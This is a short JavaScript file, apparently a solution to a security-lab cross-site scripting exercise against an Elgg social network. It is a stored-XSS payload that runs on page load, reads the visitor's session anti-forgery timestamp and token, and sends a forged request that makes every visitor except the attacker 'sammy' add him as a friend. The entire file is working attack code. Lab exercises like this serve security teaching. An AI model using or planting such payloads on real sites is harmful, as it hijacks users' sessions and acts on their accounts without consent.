window.onload = function () {
    // if the user is sammy himself, do nothing
    if (elgg.session.user.guid == 47) {
        return;
    }

    //Asynchronous JavaScript And XML.
    var Ajax = null;

    // timestamp
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    // token
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

    var sendurl = "http://www.xsslabelgg.com/action/friends/add?friend=47" + ts + token;

    // send the request
    Ajax = new XMLHttpRequest();
    Ajax.open("GET", sendurl, true);
    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    Ajax.send();

}
